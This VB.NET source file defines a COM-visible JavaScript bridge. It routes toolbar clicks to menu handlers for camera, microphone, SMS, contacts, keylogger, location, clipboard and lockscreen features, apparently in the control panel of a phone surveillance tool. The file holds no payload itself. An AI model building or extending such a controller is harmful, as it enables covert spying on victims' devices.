Imports System.Runtime.InteropServices

<ComVisible(True)>
Public Class JsBridge
    Public mainform As Form1
    Sub New(minme As Form1)
        mainform = minme
    End Sub

    <DispId(1)>
    Public Sub toolbarclick(idbtn As String)
        Dim nthread As New Threading.Thread(Sub()
                                                mainform.Invoke(Sub()
                                                                    Select Case idbtn
                                                                        Case "profile"
                                                                            mainform.ToolStripMenuItem2_Click(Nothing, Nothing)
                                                                        Case "files"
                                                                            mainform.ToolStripMenuItem3_Click(Nothing, Nothing)
                                                                        Case "Screen"
                                                                            mainform.ToolStripMenuItem4_Click(Nothing, Nothing)
                                                                        Case "Camera"
                                                                            mainform.ToolStripMenuItem5_Click(Nothing, Nothing)

                                                                        Case "Mic"
                                                                            mainform.ToolStripMenuItem1_Click(Nothing, Nothing)

                                                                        Case "SMS"
                                                                            mainform.ToolStripMenuItem7_Click(Nothing, Nothing)

                                                                        Case "Contacts"
                                                                            mainform.ToolStripMenuItem8_Click(Nothing, Nothing)

                                                                        Case "Apps"
                                                                            mainform.ToolStripMenuItem9_Click(Nothing, Nothing)

                                                                        Case "Keylogger"
                                                                            mainform.ToolStripMenuItem14_Click(Nothing, Nothing)

                                                                        Case "Location"
                                                                            mainform.ToolStrip_location_Click(Nothing, Nothing)

                                                                        Case "Browser"
                                                                            mainform.ToolStripMenuItem11_Click(Nothing, Nothing)

                                                                        Case "Screenreader"
                                                                            mainform.ScreenReaderToolStripMenuItem_Click(Nothing, Nothing)

                                                                        Case "Clipboard"
                                                                            mainform.ToolStripMenuItem20_Click(Nothing, Nothing)

                                                                        Case "Lockscreen"
                                                                            mainform.ToolStripMenuItem21_Click(Nothing, Nothing)
                                                                        Case "Chat"
                                                                            mainform.ToolStripMenuItem19_Click(Nothing, Nothing)

                                                                    End Select
                                                                End Sub)
                                            End Sub)
        nthread.IsBackground = True
        nthread.Start()

    End Sub
End Class